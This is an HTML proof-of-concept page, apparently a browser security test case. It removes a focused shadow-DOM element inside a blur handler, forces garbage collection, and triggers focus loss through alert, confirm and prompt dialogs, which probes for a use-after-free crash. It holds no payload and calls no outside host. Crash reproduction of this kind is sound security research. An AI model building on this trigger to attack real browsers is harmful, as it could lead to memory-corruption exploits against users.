<!DOCTYPE html>
<html>
<body>
<p>PoC 8 - alert/confirm/prompt</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    // tente as três (algumas plataformas só disparam em uma delas)
    try { alert('force focus loss'); } catch(e) {}
    try { confirm('force focus loss'); } catch(e) {}
    try { prompt('force focus loss'); } catch(e) {}

    setTimeout(() => {
        result.textContent = 'PASS (não crashou)';
    }, 100);
}, 100);
</script>
</body>
</html>
